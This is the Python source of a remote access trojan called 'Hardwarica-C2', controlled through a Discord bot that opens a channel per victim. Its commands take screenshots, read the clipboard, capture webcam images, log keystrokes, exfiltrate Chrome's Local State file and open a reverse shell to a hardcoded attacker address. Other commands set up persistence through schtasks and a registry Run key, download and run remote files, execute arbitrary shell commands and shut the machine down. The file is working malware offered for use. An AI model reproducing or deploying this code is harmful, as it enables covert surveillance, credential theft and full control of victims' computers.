import discord
import os
import socket
import platform
import subprocess
import pyautogui
import pyperclip
import cv2
import threading
import ctypes
import asyncio
import json
from pynput import keyboard
from discord.ext import commands
import webbrowser

# Load from config.json
with open("config.json") as f:
    config = json.load(f)

TOKEN = config["token"]
GUILD_ID = int(config["guild_id"])
REVSHELL_IP = config["revshell_ip"]
REVSHELL_PORT = int(config["revshell_port"])

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

keylog = []
logging = False
victim_channel = None

async def setup_channel():
    global victim_channel
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    hostname = socket.gethostname()
    channel_name = f"victim-{hostname.lower()}"

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }

    existing = discord.utils.get(guild.text_channels, name=channel_name)
    if existing:
        victim_channel = existing
    else:
        victim_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)

@bot.event
async def on_ready():
    await setup_channel()
    if victim_channel:
        await victim_channel.send("✅ Hardwarica-C2 Implant Online")
        await victim_channel.send("📜 Commands:
"
                                  "`!getinfo` - Get system info\n"
                                  "`!screenshot` - Capture screenshot\n"
                                  "`!clipboard` - Get clipboard\n"
                                  "`!camera` - Take webcam image\n"
                                  "`!keylogger` - Start keylogger\n"
                                  "`!dumpkeys` - Dump logged keystrokes\n"
                                  "`!stealcreds` - Exfiltrate Chrome Local State\n"
                                  "`!revshell` - Reverse shell to attacker\n"
                                  "`!persist` - Add cronjob persistence\n"
                                  "`!winpersist` - Registry Run key persistence\n"
                                  "`!upload` - Upload file to victim\n"
                                  "`!download <url> name` - Download file\n"
                                  "`!downloadrun <url>` - Download & run file\n"
                                  "`!listdir <path>` - List directory\n"
                                  "`!message popup/type <text>` - Popup or type\n"
                                  "`!shutdown` - Shutdown victim\n"
                                  "`!cmd <command>` - Run shell command\n"
                                  "`!selfdestruct` - Remove implant")
@bot.command()
async def getinfo(ctx):
    info = f"""
🖥️ System Info:
Hostname: {socket.gethostname()}
OS: {platform.system()} {platform.release()}
IP: {socket.gethostbyname(socket.gethostname())}
"""
    await victim_channel.send(f"```{info}```")

@bot.command()
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    await victim_channel.send(file=discord.File("screen.png"))
    os.remove("screen.png")

@bot.command()
async def clipboard(ctx):
    clip = pyperclip.paste()
    await victim_channel.send(f"📋 Clipboard:\n```{clip}```")

@bot.command()
async def camera(ctx):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite("cam.png", frame)
        await victim_channel.send(file=discord.File("cam.png"))
        os.remove("cam.png")
    else:
        await victim_channel.send("❌ Camera access failed")
    cam.release()

def log_keys():
    def on_press(key):
        try:
            keylog.append(str(key.char))
        except AttributeError:
            keylog.append(str(key))
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@bot.command()
async def keylogger(ctx):
    global logging
    if not logging:
        logging = True
        thread = threading.Thread(target=log_keys, daemon=True)
        thread.start()
        await victim_channel.send("🔑 Keylogger started.")
    else:
        await victim_channel.send("🔑 Keylogger already running.")

@bot.command()
async def dumpkeys(ctx):
    global logging
    logging = False
    with open("keylog.txt", "w") as f:
        f.write("".join(keylog))
    await victim_channel.send(file=discord.File("keylog.txt"))
    os.remove("keylog.txt")
    keylog.clear()

@bot.command()
async def stealcreds(ctx):
    try:
        local_state_path = os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Local State"
        if os.path.exists(local_state_path):
            await victim_channel.send("🕵️ Sending Chrome Local State file...")
            await victim_channel.send(file=discord.File(local_state_path))
        else:
            await victim_channel.send("❌ Local State file not found.")
    except Exception as e:
        await victim_channel.send(f"⚠️ Error: {e}")

@bot.command()
async def revshell(ctx):
    await victim_channel.send("💻 Starting reverse shell to attacker...")
    ip = "192.168.1.112"
    port = 4444
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"Reverse shell connected!\n")
        subprocess.Popen(["cmd.exe"], stdin=s, stdout=s, stderr=s, shell=True)
    except Exception as e:
        await victim_channel.send(f"❌ Reverse shell failed: {e}")

@bot.command()
async def persist(ctx):
    try:
        path = os.path.abspath(__file__)
        username = os.getlogin()
        task_name = "HardwaricaUserUpdater"
        command = f'schtasks /Create /SC ONLOGON /TN "{task_name}" /TR "python {path}" /RU {username} /F'
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        await victim_channel.send(f"📌 User-level persistence added:\n```{result}```")
    except subprocess.CalledProcessError as e:
        await victim_channel.send(f"❌ Persistence setup failed:\n```{e.output}```")

@bot.command()
async def winpersist(ctx):
    try:
        exe_path = os.path.abspath(__file__)
        reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v HardwaricaC2 /t REG_SZ /d "python {exe_path}" /f'
        subprocess.check_output(reg_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        await victim_channel.send("🪟 Registry persistence added via HKCU\\...\\Run")
    except subprocess.CalledProcessError as e:
        await victim_channel.send(f"❌ Failed to add persistence:\n```{e.output}```")

@bot.command()
async def upload(ctx, filepath: str):
    if not os.path.exists(filepath):
        await ctx.send("❌ File not found.")
        return

    try:
        await ctx.send(file=discord.File(filepath))
    except Exception as e:
        await ctx.send(f"❌ Failed to upload: {e}")

@bot.command()
async def download(ctx, url: str, saveas: str):
    try:
        import requests
        r = requests.get(url)
        with open(saveas, "wb") as f:
            f.write(r.content)
        await ctx.send(f"✅ Downloaded to `{saveas}`")
    except Exception as e:
        await ctx.send(f"❌ Failed to download: {e}")

@bot.command()
async def downloadrun(ctx, url: str):
    try:
        import requests
        import urllib.parse
        from pathlib import Path

        # Extract filename from URL
        filename = Path(urllib.parse.urlparse(url).path).name
        if not filename:
            await victim_channel.send("❌ Could not determine filename from URL.")
            return

        # Download the file
        r = requests.get(url)
        with open(filename, "wb") as f:
            f.write(r.content)
        await victim_channel.send(f"✅ Downloaded `{filename}`")

        # Execute the file
        if platform.system().lower() == "windows":
            subprocess.Popen(filename, shell=True)
        else:
            subprocess.run(["chmod", "+x", filename])
            subprocess.Popen(["./" + filename])
        await victim_channel.send(f"🚀 Executed `{filename}`")
    except Exception as e:
        await victim_channel.send(f"❌ Failed to download or run: {e}")


@bot.command()
async def listdir(ctx, *, path="."):
    try:
        files = os.listdir(path)
        listing = "\n".join(files)
        await victim_channel.send(f"📁 Contents of `{path}`:\n```{listing}```")
    except Exception as e:
        await victim_channel.send(f"❌ Error: {e}")

@bot.command()
async def message(ctx, method: str, *, content: str):
    if method.lower() == "popup":
        try:
            ctypes.windll.user32.MessageBoxW(0, content, "Message from Hardwarica-C2", 1)
            await victim_channel.send("📨 Popup message displayed.")
        except Exception as e:
            await victim_channel.send(f"❌ Failed to show popup:\n```{e}```")
    elif method.lower() == "type":
        try:
            pyautogui.write(content)
            await victim_channel.send("⌨️ Message typed on victim's screen.")
        except Exception as e:
            await victim_channel.send(f"❌ Failed to type message:\n```{e}```")
    else:
        await victim_channel.send("❓ Usage: `!message popup <text>` or `!message type <text>`")

@bot.command()
async def rickroll(ctx):
    try:
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        webbrowser.open(url)
        await victim_channel.send("🎵 Rickroll deployed successfully!")
    except Exception as e:
        await victim_channel.send(f"❌ Failed to rickroll:\n```{e}```")

@bot.command()
async def shutdown(ctx):
    try:
        await victim_channel.send("🔌 Shutting down victim's machine...")
        if platform.system().lower() == "windows":
            os.system("shutdown /s /t 5 /f")
        elif platform.system().lower() == "linux":
            os.system("shutdown -h now")
        else:
            await victim_channel.send("❌ Unsupported OS.")
    except Exception as e:
        await victim_channel.send(f"❌ Shutdown failed:\n```{e}```")

@bot.command()
async def cmd(ctx, *, command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        if len(output) > 1900:
            with open("cmd_output.txt", "w") as f:
                f.write(output)
            await victim_channel.send("📄 Output too long, sending as file:", file=discord.File("cmd_output.txt"))
            os.remove("cmd_output.txt")
        else:
            await victim_channel.send(f"🖥️ Command output:\n```{output}```")
    except subprocess.CalledProcessError as e:
        await victim_channel.send(f"❌ Command failed:\n```{e.output}```")

@bot.command()
async def selfdestruct(ctx):
    await victim_channel.send("☠️ Self-destructing...")
    os.remove(__file__)
    exit()

bot.run(TOKEN)
